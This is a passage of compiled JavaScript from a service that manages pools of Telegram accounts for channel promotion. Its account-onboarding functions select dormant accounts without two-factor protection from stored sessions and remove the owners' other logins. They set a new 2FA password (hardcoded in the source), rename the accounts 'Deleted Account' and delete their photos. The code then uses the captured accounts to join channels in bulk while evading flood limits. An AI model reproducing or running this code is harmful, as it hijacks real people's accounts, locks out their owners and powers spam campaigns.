            this.logger.debug(`Map Memory Check completed. Maps sizes - Join: ${this.joinChannelMap.size}, Leave: ${this.leaveChannelMap.size}, Active timeouts: ${this.activeTimeouts.size}`);
        }
        catch (error) {
            this.logger.error('Error during memory cleanup:', error);
        }
    }
    async create(promoteClient) {
        const promoteClientData = {
            ...promoteClient,
            status: promoteClient.status || 'active',
            message: promoteClient.message || 'Account is functioning properly',
        };
        const newUser = new this.promoteClientModel(promoteClientData);
        return newUser.save();
    }
    async findAll(statusFilter) {
        const filter = statusFilter ? { status: statusFilter } : {};
        return this.promoteClientModel.find(filter).exec();
    }
    async findOne(mobile, throwErr = true) {
        const user = (await this.promoteClientModel.findOne({ mobile }).exec())?.toJSON();
        if (!user && throwErr) {
            throw new common_1.NotFoundException(`PromoteClient with mobile ${mobile} not found`);
        }
        return user;
    }
    async update(mobile, updateClientDto) {
        const updatedUser = await this.promoteClientModel
            .findOneAndUpdate({ mobile }, { $set: updateClientDto }, { new: true, returnDocument: 'after' })
            .exec();
        if (!updatedUser) {
            throw new common_1.NotFoundException(`User with mobile ${mobile} not found`);
        }
        return updatedUser;
    }
    async updateStatus(mobile, status, message) {
        const updateData = { status };
        if (message) {
            updateData.message = message;
        }
        return this.update(mobile, updateData);
    }
    async updateLastUsed(mobile) {
        return this.update(mobile, { lastUsed: new Date() });
    }
    async markAsUsed(mobile, message) {
        const updateData = { lastUsed: new Date() };
        if (message) {
            updateData.message = message;
        }
        return this.update(mobile, updateData);
    }
    async markAsInactive(mobile, reason) {
        return this.updateStatus(mobile, 'inactive', reason);
    }
    async markAsActive(mobile, message = 'Account is functioning properly') {
        return this.updateStatus(mobile, 'active', message);
    }
    async createOrUpdate(mobile, createOrUpdateUserDto) {
        const existingUser = (await this.promoteClientModel.findOne({ mobile }).exec())?.toJSON();
        if (existingUser) {
            this.logger.debug('Updating existing promote client');
            return this.update(existingUser.mobile, createOrUpdateUserDto);
        }
        else {
            this.logger.debug('Creating new promote client');
            return this.create(createOrUpdateUserDto);
        }
    }
    async remove(mobile) {
        try {
            this.logger.log(`Removing PromoteClient with mobile: ${mobile}`);
            const deleteResult = await this.promoteClientModel
                .deleteOne({ mobile })
                .exec();
            if (deleteResult.deletedCount === 0) {
                throw new common_1.NotFoundException(`PromoteClient with mobile ${mobile} not found`);
            }
            await (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)()}&text=${encodeURIComponent(`Deleting Promote Client : ${mobile}`)}`);
        }
        catch (error) {
            if (error instanceof common_1.NotFoundException) {
                throw error;
            }
            const errorDetails = (0, parseError_1.parseError)(error);
            this.logger.error(`Error removing PromoteClient with mobile ${mobile}: ${errorDetails.message}`);
            throw new common_1.HttpException(errorDetails.message, errorDetails.status);
        }
        this.logger.log(`PromoteClient with mobile ${mobile} removed successfully`);
    }
    async search(filter) {
        this.logger.debug(`Search filter: ${JSON.stringify(filter)}`);
        if (filter.firstName) {
            filter.firstName = { $regex: new RegExp(filter.firstName, 'i') };
        }
        this.logger.debug(`Modified filter: ${JSON.stringify(filter)}`);
        return this.promoteClientModel.find(filter).exec();
    }
    async executeQuery(query, sort, limit, skip) {
        try {
            if (!query) {
                throw new common_1.BadRequestException('Query is invalid.');
            }
            const queryExec = this.promoteClientModel.find(query);
            if (sort) {
                queryExec.sort(sort);
            }
            if (limit) {
                queryExec.limit(limit);
            }
            if (skip) {
                queryExec.skip(skip);
            }
            return await queryExec.exec();
        }
        catch (error) {
            throw new common_1.InternalServerErrorException(error.message);
        }
    }
    removeFromPromoteMap(key) {
        const deleted = this.joinChannelMap.delete(key);
        if (deleted) {
            this.logger.debug(`Removed ${key} from join channel map`);
        }
    }
    clearPromoteMap() {
        this.logger.debug('PromoteMap cleared');
        this.joinChannelMap.clear();
        this.clearJoinChannelInterval();
    }
    async updateInfo() {
        const clients = await this.promoteClientModel
            .find({
            status: 'active',
        })
            .sort({ channels: 1 });
        for (const client of clients) {
            const mobile = client.mobile;
            try {
                this.logger.debug(`Updating info for client: ${mobile}`);
                const telegramClient = await connection_manager_1.connectionManager.getClient(mobile, {
                    autoDisconnect: false,
                    handler: false,
                });
                const channels = await telegramClient.channelInfo(true);
                this.logger.debug(`${mobile}: Found ${channels.ids.length} existing channels`);
                await this.update(mobile, { channels: channels.ids.length });
                await connection_manager_1.connectionManager.unregisterClient(mobile);
                await (0, Helpers_1.sleep)(2000);
            }
            catch (error) {
                const errorDetails = (0, parseError_1.parseError)(error);
                await this.markAsInactive(mobile, `${errorDetails.message}`);
                this.logger.error(`Error updating info for client ${client.mobile}:`, errorDetails);
            }
        }
    }
    async joinchannelForPromoteClients(skipExisting = true) {
        if (this.telegramService.getActiveClientSetup()) {
            this.logger.warn('Active client setup exists, skipping promotion process');
            return 'Active client setup exists, skipping promotion';
        }
        this.logger.log('Starting join channel process');
        this.joinChannelMap.clear();
        this.leaveChannelMap.clear();
        this.clearJoinChannelInterval();
        this.clearLeaveChannelInterval();
        await (0, Helpers_1.sleep)(3000);
        try {
            const existingKeys = skipExisting
                ? []
                : Array.from(this.joinChannelMap.keys());
            const clients = await this.promoteClientModel
                .find({
                channels: { $lt: 350 },
                mobile: { $nin: existingKeys },
                status: 'active',
            })
                .sort({ channels: 1 })
                .limit(16);
            this.logger.debug(`Found ${clients.length} clients to process for joining channels`);
            const joinSet = new Set();
            const leaveSet = new Set();
            let successCount = 0;
            let failCount = 0;
            for (let i = 0; i < clients.length; i++) {
                const document = clients[i];
                const mobile = document.mobile;
                this.logger.debug(`Processing client ${i + 1}/${clients.length}: ${mobile}`);
                try {
                    const client = await connection_manager_1.connectionManager.getClient(mobile, {
                        autoDisconnect: false,
                        handler: false,
                    });
                    await (0, Helpers_1.sleep)(2000);
                    const channels = await client.channelInfo(true);
                    this.logger.debug(`${mobile}: Found ${channels.ids.length} existing channels`);
                    await this.update(mobile, { channels: channels.ids.length });
                    if (channels.canSendFalseCount < 10) {
                        const excludedIds = channels.ids;
                        const channelLimit = 150;
                        await (0, Helpers_1.sleep)(1500);
                        const result = channels.ids.length < 220
                            ? await this.channelsService.getActiveChannels(channelLimit, 0, excludedIds)
                            : await this.activeChannelsService.getActiveChannels(channelLimit, 0, excludedIds);
                        if (!this.joinChannelMap.has(mobile)) {
                            this.joinChannelMap.set(mobile, result);
                            joinSet.add(mobile);
                        }
                        else {
                            this.logger.debug(`${mobile}: Already in join queue, skipping re-add`);
                        }
                    }
                    else {
                        this.logger.debug(`${mobile}: Too many blocked channels (${channels.canSendFalseCount}), preparing for leave`);
                        if (!this.leaveChannelMap.has(mobile)) {
                            this.leaveChannelMap.set(mobile, channels.canSendFalseChats);
                            leaveSet.add(mobile);
                        }
                        else {
                            this.logger.debug(`${mobile}: Already in leave queue, skipping re-add`);
                        }
                    }
                    successCount++;
                }
                catch (error) {
                    failCount++;
                    const errorDetails = (0, parseError_1.parseError)(error);
                    this.logger.error(`Error processing client ${mobile}:`, errorDetails);
                    const errorMsg = error?.errorMessage || errorDetails?.message || 'Unknown error';
                    if ((0, utils_1.contains)(errorDetails.message, [
                        'SESSION_REVOKED',
                        'AUTH_KEY_UNREGISTERED',
                        'USER_DEACTIVATED',
                        'USER_DEACTIVATED_BAN',
                        'FROZEN_METHOD_INVALID',
                    ])) {
                        this.logger.warn(`${mobile}: Fatal session error (${errorMsg}), marking as inactive and removing`);
                        try {
                            await this.markAsInactive(mobile, `Session error: ${errorMsg}`);
                            await (0, Helpers_1.sleep)(1000);
                        }
                        catch (statusUpdateError) {
                            this.logger.error(`Failed to update status for ${mobile}:`, statusUpdateError);
                        }
                        await (0, Helpers_1.sleep)(1000);
                        await this.remove(mobile);
                    }
                    else {
                        this.logger.warn(`${mobile}: Non-fatal error encountered, will retry later`);
                    }
                }
                finally {
                    try {
                        await connection_manager_1.connectionManager.unregisterClient(mobile);
                    }
                    catch (cleanupError) {
                        this.logger.warn(`Error during client cleanup for ${mobile}:`, cleanupError);
                    }
                    await (0, Helpers_1.sleep)(5000);
                }
            }
            await (0, Helpers_1.sleep)(3000);
            if (joinSet.size > 0) {
                this.startMemoryCleanup();
                this.logger.debug(`Starting join queue for ${joinSet.size} buffer clients`);
                this.createTimeout(() => this.joinChannelQueue(), 2000);
            }
            if (leaveSet.size > 0) {
                this.logger.debug(`Starting leave queue for ${leaveSet.size} buffer clients`);
                this.createTimeout(() => this.leaveChannelQueue(), 5000);
            }
            this.logger.log(`Join channel process completed for ${clients.length} clients (Success: ${successCount}, Failed: ${failCount})`);
            return `Initiated Joining channels for ${joinSet.size} | Queued for leave: ${leaveSet.size}`;
        }
        catch (error) {
            this.logger.error('Unexpected error during joinchannelForPromoteClients:', error);
            this.clearJoinChannelInterval();
            this.clearLeaveChannelInterval();
            throw new Error('Failed to initiate channel joining process');
        }
    }
    async joinChannelQueue() {
        this.logger.debug('Attempting to start join channel queue');
        if (this.isJoinChannelProcessing) {
            this.logger.warn('Join channel process is already running');
            return;
        }
        const existingKeys = Array.from(this.joinChannelMap.keys());
        if (existingKeys.length === 0) {
            this.logger.debug('No channels to join, not starting queue');
            return;
        }
        this.checkMemoryHealth();
        if (!this.joinChannelIntervalId) {
            this.logger.debug('Starting join channel interval');
            this.joinChannelIntervalId = setInterval(async () => {
                await this.processJoinChannelInterval();
            }, this.JOIN_CHANNEL_INTERVAL);
            this.activeTimeouts.add(this.joinChannelIntervalId);
            await this.processJoinChannelInterval();
        }
        else {
            this.logger.warn('Join channel interval is already running');
        }
    }
    async processJoinChannelInterval() {
        if (this.isJoinChannelProcessing) {
            this.logger.debug('Join channel process already running, skipping interval');
            return;
        }
        const existingKeys = Array.from(this.joinChannelMap.keys());
        if (existingKeys.length === 0) {
            this.logger.debug('No channels to join, clearing interval');
            this.clearJoinChannelInterval();
            return;
        }
        this.isJoinChannelProcessing = true;
        try {
            await this.processJoinChannelSequentially();
        }
        catch (error) {
            this.logger.error('Error in join channel queue', error);
        }
        finally {
            this.isJoinChannelProcessing = false;
            if (this.joinChannelMap.size === 0) {
                this.logger.debug('No more channels to join, clearing interval');
                this.clearJoinChannelInterval();
            }
        }
    }
    async processJoinChannelSequentially() {
        const keys = Array.from(this.joinChannelMap.keys());
        this.logger.debug(`Processing join channel queue sequentially for ${keys.length} clients`);
        for (let i = 0; i < keys.length; i++) {
            const mobile = keys[i];
            let currentChannel = null;
            try {
                const channels = this.joinChannelMap.get(mobile);
                if (!channels || channels.length === 0) {
                    this.logger.debug(`No more channels to join for ${mobile}, removing from queue`);
                    this.removeFromPromoteMap(mobile);
                    continue;
                }
                currentChannel = channels.shift();
                this.logger.debug(`${mobile} has ${channels.length} pending channels to join, processing: @${currentChannel.username}`);
                this.joinChannelMap.set(mobile, channels);
                await this.telegramService.tryJoiningChannel(mobile, currentChannel);
            }
            catch (error) {
                const errorDetails = (0, parseError_1.parseError)(error, `${mobile} ${currentChannel ? `@${currentChannel.username}` : ''} Join Channel Error: `, false);
                this.logger.error(`Error joining channel for ${mobile}: ${error.message}`);
                if (errorDetails.error === 'FloodWaitError' ||
                    error.errorMessage === 'CHANNELS_TOO_MUCH') {
                    this.logger.warn(`${mobile} has FloodWaitError or joined too many channels, removing from queue`);
                    this.removeFromPromoteMap(mobile);
                    try {
                        await (0, Helpers_1.sleep)(2000);
                        const channelsInfo = await this.telegramService.getChannelInfo(mobile, true);
                        await this.update(mobile, { channels: channelsInfo.ids.length });
                    }
                    catch (updateError) {
                        this.logger.error(`Error updating channel count for ${mobile}:`, updateError);
                    }
                }
                if ((0, utils_1.contains)(errorDetails.message, [
                    'SESSION_REVOKED',
                    'AUTH_KEY_UNREGISTERED',
                    'USER_DEACTIVATED',
                    'USER_DEACTIVATED_BAN',
                    'FROZEN_METHOD_INVALID',
                ])) {
                    this.logger.error(`Session invalid for ${mobile}, removing client`);
                    this.removeFromPromoteMap(mobile);
                    try {
                        await this.remove(mobile);
                        await (0, Helpers_1.sleep)(2000);
                    }
                    catch (removeError) {
                        this.logger.error(`Error removing client ${mobile}:`, removeError);
                    }
                }
            }
            finally {
                try {
                    await connection_manager_1.connectionManager.unregisterClient(mobile);
                }
                catch (unregisterError) {
                    this.logger.error(`Error unregistering client ${mobile}:`, unregisterError);
                }
                if (i < keys.length - 1 ||
                    this.joinChannelMap.get(mobile)?.length > 0) {
                    console.log(`Sleeping for ${this.CHANNEL_PROCESSING_DELAY} before continuing with next Mobile`);
                    await (0, Helpers_1.sleep)(this.CHANNEL_PROCESSING_DELAY);
                }
                else {
                    console.log(`Not Sleeping before continuing with next Mobile`);
                }
            }
        }
    }
    clearJoinChannelInterval() {
        if (this.joinChannelIntervalId) {
            this.logger.debug(`Clearing join channel interval: ${this.joinChannelIntervalId}`);
            clearInterval(this.joinChannelIntervalId);
            this.activeTimeouts.delete(this.joinChannelIntervalId);
            this.joinChannelIntervalId = null;
        }
        this.isJoinChannelProcessing = false;
        this.logger.debug('Join channel processing cleared and flag reset');
    }
    removeFromLeaveMap(key) {
        this.leaveChannelMap.delete(key);
        if (this.leaveChannelMap.size === 0) {
            this.clearLeaveChannelInterval();
        }
    }
    clearLeaveMap() {
        const mapSize = this.leaveChannelMap.size;
        this.leaveChannelMap.clear();
        this.clearLeaveChannelInterval();
        this.logger.debug(`LeaveMap cleared, removed ${mapSize} entries`);
    }
    async leaveChannelQueue() {
        this.logger.debug('Attempting to start leave channel queue');
        if (this.isLeaveChannelProcessing) {
            this.logger.warn('Leave channel process is already running');
            return;
        }
        const existingKeys = Array.from(this.leaveChannelMap.keys());
        if (existingKeys.length === 0) {
            this.logger.debug('No channels to leave, not starting queue');
            return;
        }
        this.checkMemoryHealth();
        if (!this.leaveChannelIntervalId) {
            this.logger.debug('Starting leave channel interval');
            this.leaveChannelIntervalId = setInterval(async () => {
                await this.processLeaveChannelInterval();
            }, this.LEAVE_CHANNEL_INTERVAL);
            this.activeTimeouts.add(this.leaveChannelIntervalId);
            await this.processLeaveChannelInterval();
        }
        else {
            this.logger.warn('Leave channel interval is already running');
        }
    }
    async processLeaveChannelInterval() {
        if (this.isLeaveChannelProcessing) {
            this.logger.debug('Leave channel process already running, skipping interval');
            return;
        }
        const existingKeys = Array.from(this.leaveChannelMap.keys());
        if (existingKeys.length === 0) {
            this.logger.debug('No channels to leave, clearing interval');
            this.clearLeaveChannelInterval();
            return;
        }
        this.isLeaveChannelProcessing = true;
        try {
            await this.processLeaveChannelSequentially();
        }
        catch (error) {
            this.logger.error('Error in leave channel queue', error);
        }
        finally {
            this.isLeaveChannelProcessing = false;
            if (this.leaveChannelMap.size === 0) {
                this.logger.debug('No more channels to leave, clearing interval');
                this.clearLeaveChannelInterval();
            }
        }
    }
    async processLeaveChannelSequentially() {
        const keys = Array.from(this.leaveChannelMap.keys());
        this.logger.debug(`Processing leave channel queue sequentially for ${keys.length} clients`);
        for (let i = 0; i < keys.length; i++) {
            const mobile = keys[i];
            try {
                const channels = this.leaveChannelMap.get(mobile);
                if (!channels || channels.length === 0) {
                    this.logger.debug(`No more channels to leave for ${mobile}, removing from queue`);
                    this.removeFromLeaveMap(mobile);
                    continue;
                }
                const totalBefore = channels.length;
                const channelsToProcess = channels.slice(0, this.LEAVE_CHANNEL_BATCH_SIZE);
                const remainingAfter = totalBefore - channelsToProcess.length;
                if (remainingAfter > 0) {
                    this.leaveChannelMap.set(mobile, channels.slice(this.LEAVE_CHANNEL_BATCH_SIZE));
                }
                else {
                    this.removeFromLeaveMap(mobile);
                }
                this.logger.debug(`${mobile} had ${totalBefore} pending channels, processing ${channelsToProcess.length}, will remain after: ${remainingAfter}`);
                if (channels.length > 0) {
                    this.leaveChannelMap.set(mobile, channels);
                }
                else {
                    this.removeFromLeaveMap(mobile);
                }
                const client = await connection_manager_1.connectionManager.getClient(mobile, {
                    autoDisconnect: false,
                    handler: false,
                });
                this.logger.debug(`${mobile} attempting to leave ${channelsToProcess.length} channels`);
                await (0, Helpers_1.sleep)(1500);
                await client.leaveChannels(channelsToProcess);
                this.logger.debug(`${mobile} left ${channelsToProcess.length} channels successfully`);
            }
            catch (error) {
                const errorDetails = (0, parseError_1.parseError)(error, `${mobile} Leave Channel ERR: `, false);
                if ((0, utils_1.contains)(errorDetails.message, [
                    'SESSION_REVOKED',
                    'AUTH_KEY_UNREGISTERED',
                    'USER_DEACTIVATED',
                    'USER_DEACTIVATED_BAN',
                    'FROZEN_METHOD_INVALID',
                ])) {
                    this.logger.error(`Session invalid for ${mobile}, removing client`);
                    try {
                        await this.remove(mobile);
                        await (0, Helpers_1.sleep)(2000);
                    }
                    catch (removeError) {
                        this.logger.error(`Error removing client ${mobile}:`, removeError);
                    }
                    this.removeFromLeaveMap(mobile);
                }
                else {
                    this.logger.warn(`Transient error for ${mobile}: ${errorDetails.message}`);
                }
            }
            finally {
                try {
                    await connection_manager_1.connectionManager.unregisterClient(mobile);
                }
                catch (unregisterError) {
                    this.logger.error(`Error unregistering client ${mobile}: ${unregisterError.message}`);
                }
                if (i < keys.length - 1 ||
                    this.leaveChannelMap.get(mobile)?.length > 0) {
                    await (0, Helpers_1.sleep)(this.LEAVE_CHANNEL_INTERVAL / 2);
                }
            }
        }
    }
    clearLeaveChannelInterval() {
        if (this.leaveChannelIntervalId) {
            this.logger.debug(`Clearing leave channel interval: ${this.leaveChannelIntervalId}`);
            clearInterval(this.leaveChannelIntervalId);
            this.activeTimeouts.delete(this.leaveChannelIntervalId);
            this.leaveChannelIntervalId = null;
        }
        this.isLeaveChannelProcessing = false;
        this.logger.debug('Leave channel interval cleared and processing flag reset');
    }
    async setAsPromoteClient(mobile, availableDate = new Date(Date.now() - 24 * 60 * 60 * 1000)
        .toISOString()
        .split('T')[0]) {
        const user = (await this.usersService.search({ mobile, expired: false }))[0];
        if (!user) {
            throw new common_1.BadRequestException('user not found');
        }
        const isExist = await this.findOne(mobile, false);
        if (isExist) {
            throw new common_1.ConflictException('PromoteClient already exist');
        }
        const clients = await this.clientService.findAll();
        const clientMobiles = clients.map((client) => client?.mobile);
        const existingAssignment = await this.promoteClientModel.findOne({
            mobile,
            clientId: { $exists: true },
        });
        if (!clientMobiles.includes(mobile) && !existingAssignment) {
            const telegramClient = await connection_manager_1.connectionManager.getClient(mobile, {
                autoDisconnect: false,
            });
            try {
                await telegramClient.set2fa();
                await (0, Helpers_1.sleep)(15000);
                await telegramClient.updateUsername('');
                await (0, Helpers_1.sleep)(3000);
                await telegramClient.updatePrivacyforDeletedAccount();
                await (0, Helpers_1.sleep)(3000);
                await telegramClient.updateProfile('Deleted Account', 'Deleted Account');
                await (0, Helpers_1.sleep)(3000);
                await telegramClient.deleteProfilePhotos();
                const channels = await this.telegramService.getChannelInfo(mobile, true);
                const promoteClient = {
                    tgId: user.tgId,
                    lastActive: 'default',
                    mobile: user.mobile,
                    availableDate,
                    channels: channels.ids.length,
                    status: 'active',
                    message: 'Manually configured as promote client',
                    lastUsed: null,
                };
                await this.promoteClientModel
                    .findOneAndUpdate({ mobile: user.mobile }, { $set: promoteClient }, { new: true, upsert: true })
                    .exec();
            }
            catch (error) {
                const errorDetails = (0, parseError_1.parseError)(error);
                throw new common_1.HttpException(errorDetails.message, errorDetails.status);
            }
            await connection_manager_1.connectionManager.unregisterClient(mobile);
            return 'Client set as promote successfully';
        }
        else {
            throw new common_1.BadRequestException('Number is a Active Client');
        }
    }
    async checkPromoteClients() {
        if (!this.telegramService.getActiveClientSetup()) {
            const clients = await this.clientService.findAll();
            const bufferClients = await this.bufferClientService.findAll();
            const clientMainMobiles = clients.map((c) => c.mobile);
            const bufferClientIds = bufferClients.map((c) => c.mobile);
            const assignedPromoteMobiles = await this.promoteClientModel
                .find({ clientId: { $exists: true }, status: 'active' })
                .distinct('mobile');
            const goodIds = [
                ...clientMainMobiles,
                ...bufferClientIds,
                ...assignedPromoteMobiles,
            ].filter(Boolean);
            const promoteClientsPerClient = new Map();
            const clientNeedingPromoteClients = [];
            const promoteClientCounts = await this.promoteClientModel.aggregate([
                {
                    $match: {
                        clientId: { $exists: true, $ne: null },
                        status: 'active',
                    },
                },
                {
                    $group: {
                        _id: '$clientId',
                        count: { $sum: 1 },
                    },
                },
            ]);
            for (const result of promoteClientCounts) {
                promoteClientsPerClient.set(result._id, result.count);
            }
            for (const client of clients) {
                const assignedCount = promoteClientsPerClient.get(client.clientId) || 0;
                promoteClientsPerClient.set(client.clientId, assignedCount);
                const needed = Math.max(0, this.MAX_NEEDED_PROMOTE_CLIENTS_PER_CLIENT - assignedCount);
                if (needed > 0) {
                    clientNeedingPromoteClients.push(client.clientId);
                }
            }
            let totalSlotsNeeded = 0;
            for (const clientId of clientNeedingPromoteClients) {
                if (totalSlotsNeeded >= this.MAX_NEW_PROMOTE_CLIENTS_PER_TRIGGER)
                    break;
                const assignedCount = promoteClientsPerClient.get(clientId) || 0;
                const needed = Math.max(0, this.MAX_NEEDED_PROMOTE_CLIENTS_PER_CLIENT - assignedCount);
                const allocatedForThisClient = Math.min(needed, this.MAX_NEW_PROMOTE_CLIENTS_PER_TRIGGER - totalSlotsNeeded);
                totalSlotsNeeded += allocatedForThisClient;
            }
            this.logger.debug(`Promote clients per client: ${JSON.stringify(Object.fromEntries(promoteClientsPerClient))}`);
            this.logger.debug(`Clients needing promote clients: ${clientNeedingPromoteClients.join(', ')}`);
            this.logger.debug(`Total slots needed: ${totalSlotsNeeded} (limited to max ${this.MAX_NEW_PROMOTE_CLIENTS_PER_TRIGGER} per trigger)`);
            const totalActivePromoteClients = await this.promoteClientModel.countDocuments({ status: 'active' });
            this.logger.debug(`Total active promote clients: ${totalActivePromoteClients}`);
            if (clientNeedingPromoteClients.length > 0 && totalSlotsNeeded > 0) {
                await this.addNewUserstoPromoteClients([], goodIds, clientNeedingPromoteClients, promoteClientsPerClient);
            }
            else {
                this.logger.debug('No new promote clients needed - all clients have sufficient promote clients');
            }
        }
        else {
            this.logger.warn('Ignored active check promote channels as active client setup exists');
        }
    }
    async addNewUserstoPromoteClients(badIds, goodIds, clientsNeedingPromoteClients = [], promoteClientsPerClient) {
        const sixMonthsAgo = new Date(Date.now() - 3 * 30 * 24 * 60 * 60 * 1000)
            .toISOString()
            .split('T')[0];
        let totalNeededFromClients = 0;
        for (const clientId of clientsNeedingPromoteClients) {
            let needed = 0;
            if (promoteClientsPerClient) {
                const currentCount = promoteClientsPerClient.get(clientId) || 0;
                needed = Math.max(0, this.MAX_NEEDED_PROMOTE_CLIENTS_PER_CLIENT - currentCount);
            }
            else {
                const currentCount = await this.promoteClientModel.countDocuments({
                    clientId,
                    status: 'active',
                });
                needed = Math.max(0, this.MAX_NEEDED_PROMOTE_CLIENTS_PER_CLIENT - currentCount);
            }
            totalNeededFromClients += needed;
        }
        const totalNeeded = Math.min(totalNeededFromClients, 10);
        if (totalNeeded === 0) {
            this.logger.debug('No promote clients needed - all clients have sufficient promote clients or limit reached');
            return;
        }
        this.logger.debug(`Limited to creating ${totalNeeded} new promote clients (max 10 per trigger)`);
        const documents = await this.usersService.executeQuery({
            mobile: { $nin: goodIds },
            expired: false,
            twoFA: false,
            lastActive: { $lt: sixMonthsAgo },
            totalChats: { $gt: 150 },
        }, { tgId: 1 }, totalNeeded + 5);
        this.logger.debug(`New promote documents to be added: ${documents.length} for ${clientsNeedingPromoteClients.length} clients needing promote clients (limited to ${totalNeeded})`);
        let processedCount = 0;
        const clientAssignmentTracker = new Map();
        for (const clientId of clientsNeedingPromoteClients) {
            let needed = 0;
            if (promoteClientsPerClient) {
                const currentCount = promoteClientsPerClient.get(clientId) || 0;
                needed = Math.max(0, this.MAX_NEEDED_PROMOTE_CLIENTS_PER_CLIENT - currentCount);
            }
            else {
                const currentCount = await this.promoteClientModel.countDocuments({
                    clientId,
                    status: 'active',
                });
                needed = Math.max(0, this.MAX_NEEDED_PROMOTE_CLIENTS_PER_CLIENT - currentCount);
            }
            clientAssignmentTracker.set(clientId, needed);
        }
        while (processedCount <
            Math.min(totalNeeded, this.MAX_NEW_PROMOTE_CLIENTS_PER_TRIGGER) &&
            documents.length > 0 &&
            clientsNeedingPromoteClients.length > 0) {
            const document = documents.shift();
            if (!document || !document.mobile || !document.tgId) {
                this.logger.warn('Invalid document found, skipping');
                continue;
            }
            let targetClientId = null;
            for (const clientId of clientsNeedingPromoteClients) {
                const needed = clientAssignmentTracker.get(clientId) || 0;
                if (needed > 0) {
                    targetClientId = clientId;
                    break;
                }
            }
            if (!targetClientId) {
                this.logger.debug('All clients have sufficient promote clients assigned');
                break;
            }
            try {
                const client = await connection_manager_1.connectionManager.getClient(document.mobile, {
                    autoDisconnect: false,
                });
                try {
                    const hasPassword = await client.hasPassword();
                    this.logger.debug(`hasPassword for ${document.mobile}: ${hasPassword}`);
                    if (!hasPassword) {
                        await client.removeOtherAuths();
                        await client.set2fa();
                        this.logger.debug('Waiting for setting 2FA');
                        await (0, Helpers_1.sleep)(30000);
                        await client.updateUsername('');
                        await (0, Helpers_1.sleep)(3000);
                        await client.updatePrivacyforDeletedAccount();
                        await (0, Helpers_1.sleep)(3000);
                        await client.updateProfile('Deleted Account', 'Deleted Account');
                        await (0, Helpers_1.sleep)(3000);
                        await client.deleteProfilePhotos();
                        const channels = await client.channelInfo(true);
                        this.logger.debug(`Inserting Document for client ${targetClientId}`);
                        const promoteClient = {
                            tgId: document.tgId,
                            lastActive: 'today',
                            mobile: document.mobile,
                            availableDate: new Date(Date.now() - 24 * 60 * 60 * 1000)
                                .toISOString()
                                .split('T')[0],
                            channels: channels.ids.length,
                            clientId: targetClientId,
                            status: 'active',
                            message: 'Account successfully configured as promote client',
                            lastUsed: null,
                        };
                        await this.create(promoteClient);
                        try {
                            await this.usersService.update(document.tgId, { twoFA: true });
                        }
                        catch (userUpdateError) {
                            this.logger.warn(`Failed to update user 2FA status for ${document.mobile}:`, userUpdateError);
                        }
                        await this.sessionService.createSession({
                            mobile: document.mobile,
                            password: "Ajtdmwajt1@"
                        });
                        this.logger.log(`=============Created PromoteClient for ${targetClientId}==============`);
                    }
                    else {
                        this.logger.debug(`Failed to Update as PromoteClient as ${document.mobile} already has Password`);
                        try {
                            await this.usersService.update(document.tgId, { twoFA: true });
                        }
                        catch (userUpdateError) {
                            this.logger.warn(`Failed to update user 2FA status for ${document.mobile}:`, userUpdateError);
                        }
                    }
                    const currentNeeded = clientAssignmentTracker.get(targetClientId) || 0;
                    const newNeeded = Math.max(0, currentNeeded - 1);
                    clientAssignmentTracker.set(targetClientId, newNeeded);
                    if (newNeeded === 0) {
                        const index = clientsNeedingPromoteClients.indexOf(targetClientId);
                        if (index > -1) {
                            clientsNeedingPromoteClients.splice(index, 1);
                        }
                    }
                    this.logger.debug(`Client ${targetClientId}: ${newNeeded} more needed, ${totalNeeded - processedCount - 1} remaining in this batch`);
                    processedCount++;
                }
                catch (error) {
                    this.logger.error(`Error processing client ${document.mobile}: ${error.message}`);
                    (0, parseError_1.parseError)(error);
                    processedCount++;
                }
                finally {
                    try {
                        await connection_manager_1.connectionManager.unregisterClient(document.mobile);
                    }
                    catch (unregisterError) {
                        this.logger.error(`Error unregistering client ${document.mobile}: ${unregisterError.message}`);
                    }
                }
            }
            catch (error) {
                this.logger.error(`Error creating client connection for ${document.mobile}: ${error.message}`);
                (0, parseError_1.parseError)(error);
            }
        }
        this.logger.log(`✅ Batch completed: Created ${processedCount} new promote clients (max ${totalNeeded} per trigger)`);
        if (clientsNeedingPromoteClients.length > 0) {
            const stillNeeded = clientsNeedingPromoteClients
                .map((clientId) => {
                const needed = clientAssignmentTracker.get(clientId) || 0;
                return `${clientId}:${needed}`;
            })
                .join(', ');
            this.logger.log(`⏳ Still needed in future triggers: ${stillNeeded}`);
        }
        else {
            this.logger.log(`🎉 All clients now have sufficient promote clients!`);
        }
    }
    clearAllTimeouts() {
        this.activeTimeouts.forEach((timeout) => {
            clearTimeout(timeout);
        });
        this.activeTimeouts.clear();
        this.logger.debug('Cleared all active timeouts');
    }
    async cleanup() {
        try {
            this.clearAllTimeouts();
            this.clearMemoryCleanup();
            this.clearJoinChannelInterval();
            this.clearLeaveChannelInterval();
            this.clearPromoteMap();
            this.clearLeaveMap();
            this.isJoinChannelProcessing = false;
            this.isLeaveChannelProcessing = false;
            this.logger.log('BufferClientService cleanup completed');
        }
        catch (error) {
            this.logger.error('Error during cleanup:', error);
        }
    }
    async onModuleDestroy() {
        this.logger.log('Cleaning up PromoteClientService resources');
        await this.cleanup();
        this.logger.log('PromoteClientService cleanup completed');
    }
    async getPromoteClientDistribution() {
        const clients = await this.clientService.findAll();
        const now = new Date();
        const last24Hours = new Date(now.getTime() - 24 * 60 * 60 * 1000);
        const [totalPromoteClients, unassignedPromoteClients, activePromoteClients, inactivePromoteClients, assignedCounts, activeCounts, inactiveCounts, neverUsedCounts, recentlyUsedCounts,] = await Promise.all([
            this.promoteClientModel.countDocuments(),
            this.promoteClientModel.countDocuments({ clientId: { $exists: false } }),
            this.promoteClientModel.countDocuments({ status: 'active' }),
            this.promoteClientModel.countDocuments({ status: 'inactive' }),
            this.promoteClientModel.aggregate([
                { $match: { clientId: { $exists: true, $ne: null } } },
                { $group: { _id: '$clientId', count: { $sum: 1 } } },
            ]),
            this.promoteClientModel.aggregate([
                {
                    $match: { clientId: { $exists: true, $ne: null }, status: 'active' },
                },
                { $group: { _id: '$clientId', count: { $sum: 1 } } },
            ]),
            this.promoteClientModel.aggregate([
                {
                    $match: {
                        clientId: { $exists: true, $ne: null },
                        status: 'inactive',
                    },
                },
                { $group: { _id: '$clientId', count: { $sum: 1 } } },
            ]),
            this.promoteClientModel.aggregate([
                {
                    $match: {
                        clientId: { $exists: true, $ne: null },
                        status: 'active',
                        $or: [{ lastUsed: { $exists: false } }, { lastUsed: null }],
                    },
                },
                { $group: { _id: '$clientId', count: { $sum: 1 } } },
